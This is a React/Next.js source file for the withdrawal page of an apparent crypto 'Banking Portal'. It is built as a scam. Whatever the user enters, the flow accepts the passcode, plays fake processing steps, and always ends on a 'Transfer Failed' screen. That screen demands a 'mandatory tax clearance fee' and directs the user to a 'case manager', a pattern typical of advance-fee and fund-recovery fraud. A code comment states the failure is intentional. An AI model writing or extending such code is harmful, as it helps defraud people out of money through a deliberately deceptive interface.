"use client";
import { useState, useEffect } from "react";
import Link from "next/link";
import { getDashboard, getAccounts, verifyWithdrawalOtp, type Asset, type LinkedBank } from "@/lib/api";

type Step = "asset" | "destination" | "amount" | "review" | "otp" | "processing" | "failed" | "done";
type DestType = "bank" | "crypto";

const NETWORKS: Record<string, string[]> = {
  BTC:  ["Bitcoin (BTC)"],
  ETH:  ["Ethereum (ERC-20)", "Arbitrum", "Optimism", "Base"],
  USDC: ["Ethereum (ERC-20)", "Solana (SPL)", "Arbitrum", "Base", "Polygon"],
  USDT: ["Ethereum (ERC-20)", "Tron (TRC-20)", "Solana (SPL)", "BNB Smart Chain"],
  SOL:  ["Solana (SPL)"],
  BNB:  ["BNB Smart Chain (BEP-20)"],
  MATIC:["Polygon"],
  AVAX: ["Avalanche C-Chain"],
};

function networksFor(symbol: string): string[] {
  return NETWORKS[symbol] ?? [`${symbol} Network`];
}

const STEP_LABELS = ["Asset", "Destination", "Amount", "Review", "Authorization"];
const FLOW_STEPS: Step[] = ["asset", "destination", "amount", "review", "otp", "processing", "failed", "done"];

export default function TransferPage() {
  const [step, setStep] = useState<Step>("asset");
  const [assets, setAssets] = useState<Asset[]>([]);
  const [linkedBanks, setLinkedBanks] = useState<LinkedBank[]>([]);
  const [loadingData, setLoadingData] = useState(true);

  const [selectedAsset, setSelectedAsset] = useState<Asset | null>(null);
  const [destType, setDestType] = useState<DestType>("bank");
  const [selectedBank, setSelectedBank] = useState<LinkedBank | null>(null);
  const [walletAddress, setWalletAddress] = useState("");
  const [walletNetwork, setWalletNetwork] = useState("");
  const [walletAddressTouched, setWalletAddressTouched] = useState(false);
  const [amount, setAmount] = useState("");

  const [otpValue, setOtpValue] = useState("");
  const [otpLoading, setOtpLoading] = useState(false);
  const [otpError, setOtpError] = useState("");

  useEffect(() => {
    Promise.all([getDashboard(), getAccounts()])
      .then(([dash, accs]) => {
        setAssets(dash.assets);
        if (dash.assets.length > 0) {
          const def = dash.assets.find(a => a.symbol === "USDC") ?? dash.assets[0];
          setSelectedAsset(def);
          setWalletNetwork(networksFor(def.symbol)[0]);
        }
        setLinkedBanks(accs.linkedBanks);
        if (accs.linkedBanks.length > 0) setSelectedBank(accs.linkedBanks[0]);
      })
      .catch(console.error)
      .finally(() => setLoadingData(false));
  }, []);

  const usdAmount = parseFloat(amount || "0") * (selectedAsset?.usdRate ?? 1);
  const fee = usdAmount * 0.005;
  const receive = usdAmount - fee;

  // Only show the stepper for the main 5 steps
  const stepIdx = FLOW_STEPS.indexOf(step);

  const destinationLabel =
    destType === "bank"
      ? selectedBank ? `${selectedBank.name} ${selectedBank.number}` : ""
      : walletAddress
        ? `${walletNetwork} — ${walletAddress.slice(0, 8)}…${walletAddress.slice(-6)}`
        : "";

  const destinationId =
    destType === "bank" ? (selectedBank?.id ?? "") : `wallet:${walletAddress}`;

  const walletValid = walletAddress.trim().length >= 26;
  const canProceedDestination = destType === "bank" ? !!selectedBank : walletValid;
  const canProceedAmount = !!amount && parseFloat(amount) > 0 && parseFloat(amount) <= (selectedAsset?.amount ?? 0);

  async function handleOtpSubmit() {
    if (!otpValue.trim()) { setOtpError("Please enter your 6-digit passcode."); return; }
    if (otpValue.trim().length !== 6) { setOtpError("Passcode must be exactly 6 characters."); return; }
    setOtpLoading(true);
    setOtpError("");
    try {
      await verifyWithdrawalOtp(otpValue.trim());
      // OTP accepted → show processing screen, then fail
      setStep("processing");
      setTimeout(() => setStep("failed"), 2800);
    } catch (e) {
      setOtpError(e instanceof Error ? e.message : "Invalid passcode.");
    } finally {
      setOtpLoading(false);
    }
  }

  function goNext() {
    if (step === "asset" && selectedAsset) {
      setWalletNetwork(networksFor(selectedAsset.symbol)[0]);
      setStep("destination");
    } else if (step === "destination" && canProceedDestination) {
      setStep("amount");
    } else if (step === "amount" && canProceedAmount) {
      setStep("review");
    } else if (step === "review") {
      setStep("otp");
    } else if (step === "otp") {
      handleOtpSubmit();
    }
  }

  function goBack() {
    if (step === "destination") setStep("asset");
    else if (step === "amount") setStep("destination");
    else if (step === "review") setStep("amount");
    else if (step === "otp") setStep("review");
  }

  function resetFlow() {
    setStep("asset");
    setAmount("");
    setWalletAddress("");
    setWalletAddressTouched(false);
    setOtpValue("");
    setOtpError("");
  }

  if (loadingData) return (
    <div className="flex items-center justify-center h-64">
      <span className="h-8 w-8 border-2 rounded-full animate-spin" style={{ borderColor: "var(--accent-teal)", borderTopColor: "transparent" }}/>
    </div>
  );

  // ── Processing screen ──────────────────────────────────────────────────────
  if (step === "processing") {
    return (
      <div className="max-w-2xl mx-auto space-y-6">
        <div>
          <p className="text-xs tracking-widest text-white/30 mb-1" style={{ fontFamily: "var(--font-mono)" }}>BANKING PORTAL</p>
          <h1 className="text-2xl font-bold text-white" style={{ fontFamily: "var(--font-display)" }}>Withdraw Funds</h1>
        </div>
        <div className="glass-card rounded-2xl p-12 flex flex-col items-center text-center gap-6">
          <div className="relative h-20 w-20">
            <div className="absolute inset-0 rounded-full border-2 animate-spin"
              style={{ borderColor: "rgba(0,212,255,0.15)", borderTopColor: "var(--accent-teal)" }}/>
            <div className="absolute inset-3 rounded-full border animate-spin"
              style={{ borderColor: "rgba(157,111,255,0.1)", borderBottomColor: "var(--accent-violet)", animationDirection: "reverse", animationDuration: "800ms" }}/>
            <div className="absolute inset-0 flex items-center justify-center">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--accent-teal)" strokeWidth="2" strokeLinecap="round">
                <path d="M5 12h14M12 5l7 7-7 7"/>
              </svg>
            </div>
          </div>
          <div>
            <h2 className="text-xl font-bold text-white mb-2" style={{ fontFamily: "var(--font-display)" }}>Processing Withdrawal</h2>
            <p className="text-sm text-white/45 max-w-xs leading-relaxed">
              Verifying authorization and routing your transfer. Please do not close this window.
            </p>
          </div>
          <div className="w-full max-w-xs space-y-2">
            {["Validating OTP authorization", "Routing to destination", "Checking compliance"].map((label, i) => (
              <div key={label} className="flex items-center gap-3 px-4 py-2.5 rounded-xl"
                style={{ background: "var(--glass-1)", border: "1px solid var(--glass-border)" }}>
                <span className="h-4 w-4 rounded-full border animate-spin flex-shrink-0"
                  style={{
                    borderColor: "rgba(0,212,255,0.2)",
                    borderTopColor: "var(--accent-teal)",
                    animationDuration: `${0.8 + i * 0.3}s`,
                  }}/>
                <span className="text-xs text-white/50" style={{ fontFamily: "var(--font-mono)" }}>{label}</span>
              </div>
            ))}
          </div>
        </div>
      </div>
    );
  }

  // ── Failed screen ──────────────────────────────────────────────────────────
  if (step === "failed") {
    return (
      <div className="max-w-2xl mx-auto space-y-6">
        <div>
          <p className="text-xs tracking-widest text-white/30 mb-1" style={{ fontFamily: "var(--font-mono)" }}>BANKING PORTAL</p>
          <h1 className="text-2xl font-bold text-white" style={{ fontFamily: "var(--font-display)" }}>Withdraw Funds</h1>
        </div>
        <div className="glass-card rounded-2xl p-8 flex flex-col items-center text-center gap-6">
          {/* Error icon */}
          <div className="h-16 w-16 rounded-2xl flex items-center justify-center"
            style={{ background: "rgba(239,68,68,0.08)", border: "1px solid rgba(239,68,68,0.2)", boxShadow: "0 0 40px rgba(239,68,68,0.08)" }}>
            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#f87171" strokeWidth="2" strokeLinecap="round">
              <circle cx="12" cy="12" r="10"/>
              <line x1="15" y1="9" x2="9" y2="15"/>
              <line x1="9" y1="9" x2="15" y2="15"/>
            </svg>
          </div>

          <div>
            <h2 className="text-xl font-bold text-white mb-2" style={{ fontFamily: "var(--font-display)" }}>Transfer Failed</h2>
            <p className="text-sm text-white/45">
              Transaction reference: <span className="font-mono text-white/60">TXN-{Date.now().toString(36).toUpperCase().slice(-8)}</span>
            </p>
          </div>

          {/* Warning message */}
          <div className="w-full rounded-2xl p-5 text-left space-y-3"
            style={{ background: "rgba(245,158,11,0.05)", border: "1px solid rgba(245,158,11,0.2)" }}>
            <div className="flex items-start gap-3">
              <div className="flex-shrink-0 mt-0.5">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" strokeWidth="2" strokeLinecap="round">
                  <path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/>
                  <line x1="12" y1="9" x2="12" y2="13"/>
                  <line x1="12" y1="17" x2="12.01" y2="17"/>
                </svg>
              </div>
              <div>
                <p className="text-sm font-semibold text-amber-400 mb-1.5">Action Required</p>
                <p className="text-sm text-white/60 leading-relaxed">
                  Your withdrawal cannot be processed at this time. A mandatory tax clearance fee must be settled before this transaction can be released. Please contact your case manager or our support team via live chat or email to resolve this and proceed.
                </p>
              </div>
            </div>
          </div>

          {/* Transfer summary */}
          <div className="w-full rounded-xl divide-y text-left"
            style={{ background: "var(--glass-1)", border: "1px solid var(--glass-border)" }}>
            {[
              ["Asset", `${selectedAsset?.name} (${selectedAsset?.symbol})`],
              ["Amount", `${amount} ${selectedAsset?.symbol}`],
              ["Value", `≈ $${usdAmount.toFixed(2)} USD`],
              ["Destination", destinationLabel || "—"],
            ].map(([label, val]) => (
              <div key={label} className="flex justify-between px-4 py-2.5">
                <span className="text-xs text-white/40">{label}</span>
                <span className="text-xs font-medium text-white/70" style={{ fontFamily: "var(--font-mono)" }}>{val}</span>
              </div>
            ))}
          </div>

          <div className="flex gap-3 w-full flex-wrap justify-center">
            <a href="mailto:support@sentryforensics.com"
              className="flex items-center gap-2 px-5 py-2.5 rounded-xl text-sm font-semibold transition-all"
              style={{ background: "linear-gradient(135deg, #f59e0b, #fcd34d)", color: "#1a0f00" }}>
              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
                <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/>
                <polyline points="22,6 12,13 2,6"/>
              </svg>
              Contact Support
            </a>
            <button onClick={resetFlow}
              className="px-5 py-2.5 rounded-xl text-sm font-semibold transition-all"
              style={{ background: "var(--glass-2)", border: "1px solid var(--glass-border)", color: "var(--fg-secondary)" }}>
              Start New Withdrawal
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="max-w-2xl mx-auto space-y-6">
      <div>
        <p className="text-xs tracking-widest text-white/30 mb-1" style={{ fontFamily: "var(--font-mono)" }}>BANKING PORTAL</p>
        <h1 className="text-2xl font-bold text-white" style={{ fontFamily: "var(--font-display)" }}>Withdraw Funds</h1>
      </div>

      {/* ── OTP Gate ── */}
      {step === "otp" && (
        <div className="glass-card rounded-2xl p-8 space-y-6 max-w-md mx-auto">
          <div className="flex flex-col items-center text-center gap-3">
            <div className="h-14 w-14 rounded-2xl flex items-center justify-center"
              style={{ background: "var(--accent-teal-dim)", border: "1px solid rgba(0,212,255,0.2)" }}>
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-teal)" strokeWidth="2" strokeLinecap="round">
                <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/>
              </svg>
            </div>
            <h2 className="text-lg font-bold text-white" style={{ fontFamily: "var(--font-display)" }}>Withdrawal Authorization</h2>
            <p className="text-sm text-white/50 leading-relaxed max-w-xs">
              Enter your one-time passcode to authorize this withdrawal. This code is personal — do not share it with anyone. Contact support if you have not received your code or are experiencing difficulties.
            </p>
          </div>

          <div className="space-y-3">
            <input
              className="sf-input text-center tracking-[0.4em] text-lg font-bold"
              style={{ fontFamily: "var(--font-mono)", letterSpacing: "0.4em" }}
              placeholder="● ● ● ● ● ●"
              type="password"
              maxLength={6}
              value={otpValue}
              onChange={e => {
                const val = e.target.value.slice(0, 6);
                setOtpValue(val);
                setOtpError("");
                if (val.length === 6) setTimeout(handleOtpSubmit, 80);
              }}
              onKeyDown={e => e.key === "Enter" && handleOtpSubmit()}
              autoFocus
            />
            <div className="flex justify-center gap-1.5 mt-1">
              {[...Array(6)].map((_, i) => (
                <span key={i} className="h-1 w-6 rounded-full transition-all"
                  style={{ background: i < otpValue.length ? "var(--accent-teal)" : "rgba(255,255,255,0.1)" }} />
              ))}
            </div>
            {otpError && <p className="text-xs text-red-400 text-center">{otpError}</p>}
            <button
              onClick={handleOtpSubmit}
              disabled={otpLoading || otpValue.trim().length !== 6}
              className="w-full py-3 rounded-xl text-sm font-bold flex items-center justify-center gap-2 disabled:opacity-40 transition-all"
              style={{ background: "linear-gradient(135deg, #f59e0b, #fcd34d)", color: "#1a0f00" }}>
              {otpLoading
                ? <><span className="h-4 w-4 border-2 border-[#1a0f00] border-t-transparent rounded-full animate-spin"/>Verifying…</>
                : "Verify & Authorize"}
            </button>
          </div>

          <div className="flex items-center justify-center gap-4 text-xs text-white/25">
            <button onClick={goBack} className="hover:text-white/50 transition-colors">← Back</button>
            <span>·</span>
            <a href="mailto:support@sentryforensics.com" className="hover:text-white/50 transition-colors">Contact Support</a>
          </div>
        </div>
      )}

      {/* Progress stepper (not shown on otp/processing/failed/done) */}
      {!["otp", "processing", "failed", "done"].includes(step) && (
        <div className="flex items-center gap-0">
          {STEP_LABELS.map((s, i) => (
            <div key={s} className="flex items-center flex-1">
              <div className="flex flex-col items-center">
                <div className="h-7 w-7 rounded-full flex items-center justify-center text-xs font-bold transition-all"
                  style={{
                    background: i < stepIdx ? "var(--accent-teal-dim)" : i === stepIdx ? "linear-gradient(135deg, #00d4ff, #9d6fff)" : "var(--glass-1)",
                    border: `1px solid ${i <= stepIdx ? "rgba(0,212,255,0.3)" : "var(--glass-border)"}`,
                    color: i < stepIdx ? "var(--accent-teal)" : i === stepIdx ? "#fff" : "var(--fg-tertiary)",
                    fontFamily: "var(--font-mono)",
                  }}>
                  {i < stepIdx ? "✓" : i + 1}
                </div>
                <span className="text-[10px] mt-1 text-white/30" style={{ fontFamily: "var(--font-mono)" }}>{s}</span>
              </div>
              {i < STEP_LABELS.length - 1 && (
                <div className="flex-1 h-px mx-2 mt-[-14px]" style={{ background: i < stepIdx ? "var(--accent-teal)" : "var(--glass-border)" }}/>
              )}
            </div>
          ))}
        </div>
      )}

      {!["otp", "processing", "failed"].includes(step) && (
        <div className="glass-card rounded-2xl p-6 space-y-5">

          {/* ── Step 1: Asset ── */}
          {step === "asset" && (
            <>
              <p className="text-xs font-semibold text-white/40 tracking-wide" style={{ fontFamily: "var(--font-mono)" }}>SELECT ASSET TO WITHDRAW</p>
              {assets.length === 0 ? (
                <p className="text-sm text-white/30 py-6 text-center">No assets available.</p>
              ) : (
                <div className="space-y-2">
                  {assets.map(a => (
                    <button key={a.symbol} onClick={() => setSelectedAsset(a)}
                      className="w-full flex items-center gap-3 p-4 rounded-xl text-left transition-all"
                      style={{
                        background: selectedAsset?.symbol === a.symbol ? `${a.color}12` : "var(--glass-1)",
                        border: `1px solid ${selectedAsset?.symbol === a.symbol ? `${a.color}35` : "var(--glass-border)"}`,
                      }}>
                      <span className="h-10 w-10 rounded-xl flex items-center justify-center text-lg font-bold flex-shrink-0"
                        style={{ background: `${a.color}18`, color: a.color, fontFamily: "var(--font-mono)" }}>{a.icon}</span>
                      <div className="flex-1 min-w-0">
                        <p className="text-sm font-semibold text-white">{a.name}</p>
                        <p className="text-xs text-white/40">{a.amount.toLocaleString()} {a.symbol}</p>
                      </div>
                      <div className="text-right shrink-0">
                        <p className="text-sm font-semibold text-white">${(a.usd).toLocaleString("en-US", { maximumFractionDigits: 2 })}</p>
                        <p className="text-[10px] text-white/30" style={{ fontFamily: "var(--font-mono)" }}>@ ${a.usdRate.toLocaleString()}</p>
                      </div>
                      {selectedAsset?.symbol === a.symbol && (
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="var(--accent-teal)" strokeWidth="2.5" strokeLinecap="round" className="shrink-0">
                          <polyline points="20,6 9,17 4,12"/>
                        </svg>
                      )}
                    </button>
                  ))}
                </div>
              )}
            </>
          )}

          {/* ── Step 2: Destination ── */}
          {step === "destination" && (
            <>
              <p className="text-xs font-semibold text-white/40 tracking-wide" style={{ fontFamily: "var(--font-mono)" }}>WITHDRAWAL DESTINATION</p>
              <div className="grid grid-cols-2 gap-2">
                {(["bank", "crypto"] as DestType[]).map(t => (
                  <button key={t} onClick={() => setDestType(t)}
                    className="py-3 rounded-xl text-sm font-semibold flex items-center justify-center gap-2 transition-all"
                    style={{
                      background: destType === t ? "var(--accent-teal-dim)" : "var(--glass-1)",
                      border: `1px solid ${destType === t ? "rgba(0,212,255,0.3)" : "var(--glass-border)"}`,
                      color: destType === t ? "var(--accent-teal)" : "var(--fg-secondary)",
                    }}>
                    {t === "bank" ? (
                      <><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9,22 9,12 15,12 15,22"/></svg> Bank Account</>
                    ) : (
                      <><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 21V5a2 2 0 00-2-2h-4a2 2 0 00-2 2v16"/></svg> Crypto Wallet</>
                    )}
                  </button>
                ))}
              </div>

              {destType === "bank" && (
                linkedBanks.length === 0 ? (
                  <div className="p-5 rounded-xl text-sm text-white/30 text-center" style={{ background: "var(--glass-1)", border: "1px solid var(--glass-border)" }}>
                    No linked bank accounts on file.<br/>
                    <span className="text-xs text-white/20">Contact your case manager to add a withdrawal account.</span>
                  </div>
                ) : (
                  <div className="space-y-2">
                    {linkedBanks.map(b => (
                      <button key={b.id} onClick={() => setSelectedBank(b)}
                        className="w-full flex items-center gap-3 p-4 rounded-xl text-left transition-all"
                        style={{
                          background: selectedBank?.id === b.id ? "var(--accent-teal-dim)" : "var(--glass-1)",
                          border: `1px solid ${selectedBank?.id === b.id ? "rgba(0,212,255,0.25)" : "var(--glass-border)"}`,
                        }}>
                        <span className="text-2xl">{b.country}</span>
                        <div className="flex-1">
                          <p className="text-sm font-semibold text-white">{b.name}</p>
                          <p className="text-xs text-white/40" style={{ fontFamily: "var(--font-mono)" }}>{b.type} · {b.number}</p>
                        </div>
                        {b.verified && <span className="text-[10px] px-2 py-0.5 rounded-full" style={{ background: "rgba(0,240,160,0.1)", color: "var(--accent-emerald)", border: "1px solid rgba(0,240,160,0.2)" }}>Verified</span>}
                        {selectedBank?.id === b.id && (
                          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--accent-teal)" strokeWidth="2.5" strokeLinecap="round">
                            <polyline points="20,6 9,17 4,12"/>
                          </svg>
                        )}
                      </button>
                    ))}
                  </div>
                )
              )}

              {destType === "crypto" && (
                <div className="space-y-4">
                  <div>
                    <label className="block text-xs font-medium text-white/50 mb-1.5">Network</label>
                    <select value={walletNetwork} onChange={e => setWalletNetwork(e.target.value)} className="sf-input" style={{ background: "var(--glass-1)" }}>
                      {networksFor(selectedAsset?.symbol ?? "").map(n => (
                        <option key={n} value={n} style={{ background: "#0d1117" }}>{n}</option>
                      ))}
                    </select>
                  </div>
                  <div>
                    <label className="block text-xs font-medium text-white/50 mb-1.5">
                      Wallet Address
                      <span className="text-white/25 ml-2 font-normal">({selectedAsset?.symbol} address on {walletNetwork})</span>
                    </label>
                    <input
                      className="sf-input font-mono text-sm"
                      placeholder="Paste your wallet address here"
                      value={walletAddress}
                      onChange={e => setWalletAddress(e.target.value)}
                      onBlur={() => setWalletAddressTouched(true)}
                      style={{ fontFamily: "var(--font-mono)", letterSpacing: "0.02em" }}
                    />
                    {walletAddressTouched && !walletValid && (
                      <p className="mt-1.5 text-xs text-red-400">Enter a valid wallet address (min. 26 characters).</p>
                    )}
                  </div>
                  <div className="flex items-start gap-2 p-3 rounded-lg" style={{ background: "rgba(245,158,11,0.06)", border: "1px solid rgba(245,158,11,0.15)" }}>
                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" strokeWidth="2" strokeLinecap="round" className="shrink-0 mt-0.5">
                      <path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/>
                    </svg>
                    <p className="text-xs text-white/45 leading-5">Ensure the address matches the selected network. Funds sent to the wrong network may be permanently lost.</p>
                  </div>
                </div>
              )}
            </>
          )}

          {/* ── Step 3: Amount ── */}
          {step === "amount" && selectedAsset && (
            <>
              <p className="text-xs font-semibold text-white/40 tracking-wide" style={{ fontFamily: "var(--font-mono)" }}>ENTER AMOUNT</p>
              <div className="p-3 rounded-xl flex items-center gap-3" style={{ background: "var(--glass-1)", border: "1px solid var(--glass-border)" }}>
                <span className="h-8 w-8 rounded-lg flex items-center justify-center text-sm font-bold flex-shrink-0"
                  style={{ background: `${selectedAsset.color}18`, color: selectedAsset.color, fontFamily: "var(--font-mono)" }}>
                  {selectedAsset.icon}
                </span>
                <div className="flex-1 min-w-0">
                  <p className="text-xs text-white/40">{destType === "bank" ? "Bank" : "Wallet"} · {destinationLabel || "—"}</p>
                  <p className="text-sm font-semibold text-white truncate">{selectedAsset.name}</p>
                </div>
                <button onClick={() => setStep("destination")} className="text-[10px] text-white/30 hover:text-white/60 transition-colors" style={{ fontFamily: "var(--font-mono)" }}>CHANGE</button>
              </div>
              <div>
                <div className="relative">
                  <span className="absolute left-3.5 top-1/2 -translate-y-1/2 text-2xl pointer-events-none"
                    style={{ fontFamily: "var(--font-mono)", color: selectedAsset.color }}>
                    {selectedAsset.icon}
                  </span>
                  <input type="number" className="sf-input pl-14 py-4 text-xl font-bold"
                    style={{ fontFamily: "var(--font-display)", fontSize: "22px" }}
                    placeholder="0.00" value={amount} onChange={e => setAmount(e.target.value)}/>
                </div>
                <div className="flex justify-between mt-2 text-xs text-white/35">
                  <span>≈ ${usdAmount.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD</span>
                  <button onClick={() => setAmount(String(selectedAsset.amount))} className="text-white/55 hover:text-white transition-colors">
                    MAX: {selectedAsset.amount.toLocaleString()} {selectedAsset.symbol}
                  </button>
                </div>
                {amount && parseFloat(amount) > selectedAsset.amount && (
                  <p className="mt-1.5 text-xs text-red-400">Exceeds available balance.</p>
                )}
              </div>
              <div className="grid grid-cols-4 gap-2">
                {[25, 50, 75, 100].map(pct => (
                  <button key={pct} onClick={() => setAmount(((selectedAsset.amount * pct) / 100).toFixed(6).replace(/\.?0+$/, ""))}
                    className="py-2 rounded-lg text-xs font-semibold transition-all"
                    style={{ background: "var(--glass-1)", border: "1px solid var(--glass-border)", color: "var(--fg-secondary)", fontFamily: "var(--font-mono)" }}
                    onMouseEnter={e => (e.currentTarget.style.background = "var(--glass-2)")}
                    onMouseLeave={e => (e.currentTarget.style.background = "var(--glass-1)")}>
                    {pct}%
                  </button>
                ))}
              </div>
              <div className="space-y-2 p-4 rounded-xl" style={{ background: "var(--glass-1)", border: "1px solid var(--glass-border)" }}>
                {[
                  ["Rate", `1 ${selectedAsset.symbol} = $${selectedAsset.usdRate.toLocaleString()}`],
                  ["Network fee (0.5%)", `$${fee.toFixed(2)}`],
                  ["You receive", destType === "bank" ? `$${receive.toFixed(2)}` : `${(parseFloat(amount || "0") * 0.995).toFixed(6)} ${selectedAsset.symbol}`],
                ].map(([label, val]) => (
                  <div key={label} className="flex justify-between text-sm">
                    <span className="text-white/45">{label}</span>
                    <span className="font-semibold text-white" style={{ fontFamily: "var(--font-mono)" }}>{val}</span>
                  </div>
                ))}
              </div>
            </>
          )}

          {/* ── Step 4: Review ── */}
          {step === "review" && selectedAsset && (
            <>
              <p className="text-xs font-semibold text-white/40 tracking-wide" style={{ fontFamily: "var(--font-mono)" }}>REVIEW WITHDRAWAL</p>
              <div className="rounded-xl overflow-hidden divide-y" style={{ border: "1px solid var(--glass-border)" }}>
                {[
                  ["Asset", `${selectedAsset.name} (${selectedAsset.symbol})`],
                  ["Amount", `${amount} ${selectedAsset.symbol}`],
                  ["Value", `≈ $${usdAmount.toFixed(2)} USD`],
                  ["Destination type", destType === "bank" ? "Bank Account" : "Crypto Wallet"],
                  ["To", destinationLabel],
                  ...(destType === "crypto" ? [["Network", walletNetwork]] : []),
                  ["Network fee (0.5%)", `$${fee.toFixed(2)}`],
                  ["You receive", destType === "bank" ? `$${receive.toFixed(2)}` : `${(parseFloat(amount) * 0.995).toFixed(6)} ${selectedAsset.symbol}`],
                  ["Est. arrival", destType === "bank" ? "1–3 business days" : "10–60 minutes"],
                ].map(([label, val]) => (
                  <div key={label} className="flex flex-col xs:flex-row xs:justify-between px-4 py-3 gap-0.5">
                    <span className="text-xs sm:text-sm text-white/45 shrink-0">{label}</span>
                    <span className="text-xs sm:text-sm font-semibold text-white break-all xs:text-right xs:ml-4" style={{ fontFamily: "var(--font-mono)" }}>{val}</span>
                  </div>
                ))}
              </div>
              <div className="flex items-start gap-3 p-3 rounded-xl" style={{ background: "rgba(245,158,11,0.06)", border: "1px solid rgba(245,158,11,0.15)" }}>
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" strokeWidth="2" strokeLinecap="round" className="flex-shrink-0 mt-0.5">
                  <path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/>
                </svg>
                <p className="text-xs text-white/50 leading-5">Once confirmed, this withdrawal cannot be reversed. Double-check {destType === "crypto" ? "your wallet address and network" : "your bank account details"} before proceeding.</p>
              </div>
            </>
          )}

          {/* Nav buttons */}
          {step !== "done" && (
            <div className="flex gap-3 pt-2">
              {step !== "asset" && (
                <button onClick={goBack}
                  className="flex-1 py-3 rounded-xl text-sm font-semibold transition-all"
                  style={{ background: "var(--glass-1)", border: "1px solid var(--glass-border)", color: "var(--fg-secondary)" }}>
                  Back
                </button>
              )}
              <button
                onClick={goNext}
                disabled={
                  (step === "asset" && !selectedAsset) ||
                  (step === "destination" && !canProceedDestination) ||
                  (step === "amount" && !canProceedAmount)
                }
                className="flex-1 py-3 rounded-xl text-sm font-bold transition-all flex items-center justify-center gap-2 disabled:opacity-40"
                style={{ background: "linear-gradient(135deg, #f59e0b, #fcd34d)", color: "#1a0f00" }}>
                {step === "review" ? "Confirm & Authorize" : "Continue"}
              </button>
            </div>
          )}
        </div>
      )}
    </div>
  );
}
